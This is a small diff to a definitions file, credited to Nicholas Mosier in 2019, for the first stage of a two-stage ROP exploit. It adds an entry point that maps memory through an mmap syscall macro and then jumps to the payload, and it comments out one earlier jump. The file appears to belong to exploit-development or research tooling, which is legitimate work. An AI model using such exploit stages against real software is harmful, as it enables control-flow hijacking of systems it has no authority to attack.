@@ -1,5 +1,6 @@
 /* stage1.gds -- definitions for the first stage of a two-stage ROP exploit
  * Nicholas Mosier 2019
+ * note: the compiler should be told to use NO padding when using this.
  */
 
 /* requires that the following equates be defined elsewhere:
@@ -26,7 +27,7 @@ MAP_PAYLOAD :=
   MOV r9,0
   MOV rax,MMAP_SYSCALL
   SYSCALL_BARE
-  JMP PAYLOAD_START
+//  JMP PAYLOAD_START
 
 #
 
@@ -34,3 +35,7 @@ __START__:
   org PAYLOAD_ADDR
   JMP PAYLOAD_START
   resq (PADDING + PAYLOAD_ADDR - $) / 8
+__ENTRY__:
+  MAP_PAYLOAD
+  INIT
+  JMP PAYLOAD_START
